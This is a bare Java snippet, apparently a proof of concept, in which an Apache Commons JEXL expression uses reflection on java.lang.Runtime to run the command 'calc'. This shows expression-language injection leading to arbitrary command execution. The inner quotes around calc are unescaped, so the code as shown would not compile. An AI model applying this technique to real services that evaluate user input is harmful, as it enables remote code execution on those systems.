JexlContext jc = new MapContext();
Expression e = new JexlEngine().createExpression("''.class.forName('java.lang.Runtime').getRuntime().exec("calc")");
Object result = e.evaluate(jc);
System.out.println(result);
